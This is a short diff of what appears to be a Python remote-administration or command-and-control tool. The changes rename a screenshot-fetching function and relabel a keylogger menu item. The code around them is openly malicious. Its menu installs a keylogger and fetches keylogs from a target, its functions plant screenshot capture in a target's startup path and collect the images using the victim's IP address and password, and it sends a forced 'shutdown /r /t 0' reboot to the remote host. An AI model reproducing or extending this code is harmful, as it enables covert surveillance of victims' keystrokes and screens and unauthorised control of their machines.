@@ -40,7 +40,7 @@ help_menu = """
 options_menu = """
             [+] command and control:
                 [0] Remote Console
-                [1] Keylogger       
+                [1] Install Keylogger       
                 [2] Fetch keylogs
                 [3] Install Screenshot
                 [4] Fetch Screenshot
@@ -147,7 +147,7 @@ def install_screenshot(ipv4,pword,temp_path,startup_path):
     print("[*] Download completed...")
     print("[*] Restart target host to start...")
 
-def grab_screenshot(ipv4,pword,temp_path,uname):
+def fetch_screenshot(ipv4,pword,temp_path,uname):
     print("[+] preparing to fetch screenshots...")
     ss_folder = f"screenshots-{uname}-{get_current_date()}"
 
@@ -197,7 +197,7 @@ def cli(arguments):
                 elif option == "3":
                     install_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "4":
-                    grab_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
+                    fetch_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
                 elif option == "7":
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                 elif option == "8":
